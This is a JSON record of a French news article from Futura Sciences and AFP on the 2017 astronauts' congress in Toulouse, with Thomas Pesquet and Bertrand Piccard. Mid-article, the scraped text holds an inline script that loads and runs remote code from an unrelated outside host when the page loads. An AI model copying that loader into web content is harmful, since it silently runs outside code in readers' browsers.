{"title": "100 astronautes, dont Thomas Pesquet, se réunissent à Toulouse", "newspaper": "Futura Sciences", "author": "AFP", "date_publi": "17/10/2017", "content": "Pour la première fois, le congrès mondial des astronautes a lieu en France, à Toulouse. L'axe des discussions est  L'espace est mon futur . Le but est d'inciter les jeunes à s'engager dans des carrières scientifiques, à l'heure où la présence de l'Homme dans l'espace rencontre un regain d'intérêt, comme l'expliquent les intervenants. La 30 e  édition du congrès mondial des  astronautes  a retenu comme axe thématique  L'espace est mon futur , une devise imaginée par une écolière toulousaine. Elle se décline en deux grands thèmes, comme l'explique Jean-Baptiste Desbois, directeur général de la  Cité de l'Espace .  « L'exploration de mondes inconnus, les astronautes étant les Christophe Colomb d'aujourd'hui »  et  « l'importance de protéger la  Terre , qui semble si fragile vue depuis l'espace » . Une centaine d'astronautes ont fait le voyage jusqu'à Toulouse, dont les Français  Thomas Pesquet , Claudie Haignéré et  Jean-François Clervoy . Le congrès a pour invité d'honneur l'aéronaute suisse  Bertrand Piccard , explorateur et ardent promoteur de la protection de l'environnement et de l' énergie renouvelable . Pendant la semaine, les congressistes vont notamment parler de l' ISS  mais aussi des projets spatiaux du futur.  « Il y a un regain d'intérêt pour envoyer l'Homme dans l'espace » , note Jean-Yves Le Gall, le président du Cnes, l'agence spatiale française.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  « La revanche des vols habités » Lors du 68 e   congrès international d'astronautique  (IAC), qui s'est tenu fin septembre à Adélaïde (Australie),  « il a été beaucoup question d'exploration avec des missions envisagées vers la  Lune  et vers Mars. Ce qui me frappe, c'est que dans tous les cas, il y a des astronautes. C'est un peu la revanche des vols habités sur les missions automatiques » , dit-il à l'AFP. Le congrès consacrera la journée de jeudi aux jeunes. Les astronautes iront à la rencontre d'élèves et d'étudiants dans une trentaine de villes françaises.  « En Europe, nous manquons de jeunes qui s'investissent dans les  carrières scientifiques  » , a déclaré à l'AFP le Belge Frank De Winne, chef des astronautes européens. Selon lui,  « l'objectif est de développer leur curiosité, de leur montrer que le monde de la science est très intéressant » . L'ISS comme si vous y étiez                       Embarquez à bord de la Station spatiale internationale (ISS) pour une visite complète en vue subjective. La caméra « fish-eye » nous fait entrer dans tous les modules, offrant des vues inédites. Bien sûr, la balade passe par Cupola, la baie vitrée sur l'espace... et la Terre.                                       Vous avez aimé cet article ? N'hésitez pas à le partager avec vos ami(e)s et aidez-nous à faire connaître Futura :) ! La Rédaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest À voir aussi :  thomas pesquet  |  astronautes chinois  |  cellule de thomas  |  qui est thomas edison  |  thomas harriot  |  thomas lafforgue  |  cellule de thomas comptage  |  glucides dont sucres  |  hommes ne desirent ce dont ont besoin  |  personne dont metier de prendre des oiseaux", "theme": "sciences"}